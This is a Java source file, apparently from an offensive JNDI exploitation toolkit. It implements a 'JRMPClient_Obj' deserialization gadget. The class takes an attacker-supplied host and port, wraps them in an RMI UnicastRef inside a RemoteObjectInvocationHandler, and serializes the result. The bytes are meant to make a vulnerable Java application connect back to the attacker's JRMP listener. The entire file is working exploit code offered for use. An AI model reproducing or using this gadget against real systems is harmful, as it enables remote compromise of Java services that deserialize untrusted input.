package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class JRMPClient_Obj implements ObjectPayload<RemoteObjectInvocationHandler>{
    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = param[0];
        String host;
        int    port, sep = command.indexOf(':');
        if (sep < 0) {
            port = (new Random()).nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1)).intValue();
        }
        ObjID                         id  = new ObjID((new Random()).nextInt());
        TCPEndpoint                   te  = new TCPEndpoint(host, port);
        UnicastRef                    ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(obj);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public RemoteObjectInvocationHandler getObject(String command) throws Exception {
        return null;
    }
}
